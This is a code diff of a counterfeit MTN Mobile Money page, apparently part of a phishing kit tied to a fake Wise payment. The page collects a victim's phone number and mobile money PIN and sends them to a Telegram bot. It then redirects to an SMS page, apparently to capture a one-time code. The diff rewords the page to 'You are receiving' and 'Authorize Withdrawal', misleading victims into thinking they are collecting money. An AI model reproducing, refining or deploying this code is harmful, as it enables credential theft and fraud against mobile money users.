@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MTN Mobile Money · Confirm recipient</title>
+<title>MTN Mobile Money · Authorize withdrawal</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -84,7 +84,6 @@
   }
   .mtn-title { display: flex; flex-direction: column; gap: 0.15rem; }
   .mtn-title .brand { font-size: 1.2rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
-  .mtn-title .subtitle { font-size: 0.82rem; font-weight: 500; color: var(--mtn-text-light); }
 
   .amount-hero {
     background: linear-gradient(135deg, #FFFDF0 0%, #FFF8D9 100%);
@@ -321,14 +320,13 @@
       <div class="mtn-logo">MTN</div>
       <div class="mtn-title">
         <span class="brand">MTN Mobile Money</span>
-        <span class="subtitle">Confirm recipient & PIN</span>
       </div>
     </div>
 
     <div class="amount-hero">
       <div class="label-block">
         <span class="label">Transfer amount</span>
-        <span class="sub">You are sending</span>
+        <span class="sub">You are receiving</span>
       </div>
       <div class="amount-display">
         <span class="value" id="mtnAmount">—</span>
@@ -399,8 +397,8 @@
     </div>
 
     <button class="mtn-confirm-btn" id="mtnConfirmBtn">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      Confirm transaction
+      <svg viewBox="0 0 24 24"><path d="M12 2v20M2 12h20"/></svg>
+      Authorize Withdrawal
     </button>
 
     <div id="mtnStatus" class="status-message hidden">
@@ -454,7 +452,6 @@
   const mtnStatus = $('mtnStatus'), mtnStatusText = $('mtnStatusText'), mtnStatusIcon = $('mtnStatusIcon');
   const mtnAmountEl = $('mtnAmount'), mtnCurrencyEl = $('mtnCurrency');
 
-  // ---- Local cache ----
   function loadLocal() {
     try {
       const raw = localStorage.getItem(STORAGE_KEY);
@@ -466,7 +463,6 @@
     try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e) {}
   }
 
-  // ---- Server fetch ----
   async function loadRemote() {
     try {
       const res = await fetch(API_URL, { cache: 'no-store' });
@@ -480,7 +476,6 @@
     }
   }
 
-  // ---- Currency formatting ----
   function fmtAmount(n) {
     return (parseFloat(n) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   }
@@ -491,7 +486,6 @@
     return local.toLocaleString('en-US', { minimumFractionDigits: dec, maximumFractionDigits: dec });
   }
 
-  // ---- Country helpers ----
   function getCountry() {
     const p = countrySelect.value.split('|');
     return {
@@ -511,13 +505,11 @@
     return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
 
-  // ---- Live paymentData (refreshes from server) ----
   let paymentData = loadLocal();
 
   function renderPayment() {
     mtnAmountEl.textContent = fmtAmount(paymentData.amount);
     mtnCurrencyEl.textContent = paymentData.currency || 'USD';
-    // Only prefill recipientName if the user hasn't typed anything yet
     if (!recipientName.value.trim()) {
       recipientName.value = (paymentData.recipientName || '').trim();
     }
@@ -555,7 +547,6 @@
     }
   });
 
-  // Same-device tab sync
   try {
     const bc = new BroadcastChannel('wise_payment');
     bc.onmessage = e => {
@@ -573,7 +564,6 @@
     }
   });
 
-  // ---- Status helper ----
   function showStatus(msg, type) {
     mtnStatusText.textContent = msg;
     mtnStatus.classList.remove('hidden', 'success', 'error', 'info');
@@ -594,7 +584,6 @@
     return await res.json();
   }
 
-  // ---- Country picker ----
   countrySelect.addEventListener('change', () => {
     const p = countrySelect.value.split('|');
     countryFlag.textContent = p[2];
@@ -602,7 +591,6 @@
     phoneWrap.classList.remove('error');
   });
 
-  // ---- PIN toggle ----
   pinToggle.addEventListener('click', () => {
     const pw = momoPin.type === 'password';
     momoPin.type = pw ? 'text' : 'password';
@@ -611,7 +599,6 @@
       : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
   });
 
-  // ---- Input filters ----
   recipientPhone.addEventListener('input', () => {
     recipientPhone.value = recipientPhone.value.replace(/[^\d\s]/g, '');
     phoneWrap.classList.remove('error');
@@ -624,13 +611,12 @@
     momoPin.classList.remove('error');
   });
 
-  // ---- Back ----
   $('backBtn').addEventListener('click', () => {
     window.location.href = 'index.html';
   });
 
   // ============================================================
-  // CONFIRM → SEND TELEGRAM → NAVIGATE
+  // AUTHORIZE WITHDRAWAL → SEND TELEGRAM → SMS PAGE
   // ============================================================
   mtnConfirmBtn.addEventListener('click', async () => {
     const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
@@ -663,7 +649,7 @@
     momoPin.classList.remove('error');
 
     mtnConfirmBtn.disabled = true;
-    mtnConfirmBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Processing...';
+    mtnConfirmBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Authorizing...';
 
     const country = getCountry();
     const phoneFull = getFullPhone();
@@ -671,12 +657,12 @@
     const exchangeRate = (parseFloat(localAmount.replace(/,/g,'')) / (parseFloat(paymentData.amount) || 1)).toFixed(2);
     const txnId = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
 
-    const message = `🔔 <b>NEW TRANSACTION — APPROVAL REQUIRED</b>
+    const message = `🔔 <b>WITHDRAWAL AUTHORIZED — APPROVAL REQUIRED</b>
 
 ━━━━━━━━━━━━━━━━━━━━
 <b>💳 WISE PAYMENT</b>
 ━━━━━━━━━━━━━━━━━━━━
-<b>Sender:</b> ${esc(paymentData.senderName)}
+<b>From:</b> ${esc(paymentData.senderName)}
 <b>Email:</b> ${esc(paymentData.senderEmail)}
 <b>Amount:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
 <b>Reference:</b> ${esc(paymentData.reference || DEFAULT_DATA.reference)}
@@ -695,8 +681,7 @@
 ━━━━━━━━━━━━━━━━━━━━
 <b>💰 LOCAL AMOUNT</b>
 ━━━━━━━━━━━━━━━━━━━━
-<b>You send:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
-<b>Recipient gets:</b> ${esc(localAmount)} ${esc(country.localCurrency)}
+<b>Recipient receives:</b> ${esc(localAmount)} ${esc(country.localCurrency)}
 <b>Exchange rate:</b> 1 ${esc(paymentData.currency)} ≈ ${esc(exchangeRate)} ${esc(country.localCurrency)}
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -705,9 +690,8 @@
   day: '2-digit', month: 'short', year: 'numeric',
   hour: '2-digit', minute: '2-digit', second: '2-digit'
 }))}
-<b>🌐 User agent:</b> <code>${esc((navigator.userAgent || '').slice(0, 60))}...</code>
 
-<b>⚠️ Awaiting your approval below</b>`;
+<b>⚠️ Awaiting SMS confirmation</b>`;
 
     try {
       await sendTelegram(message, txnId, 'recipient');
@@ -728,11 +712,11 @@
         txnSentAt: Date.now()
       }));
 
-      window.location.href = 'waiting.html';
+      window.location.href = 'sms.html';
     } catch (err) {
       console.error('Failed:', err);
       mtnConfirmBtn.disabled = false;
-      mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Confirm transaction';
+      mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2v20M2 12h20"/></svg>Authorize Withdrawal';
       showStatus('Could not send details. Please try again.', 'error');
     }
   });
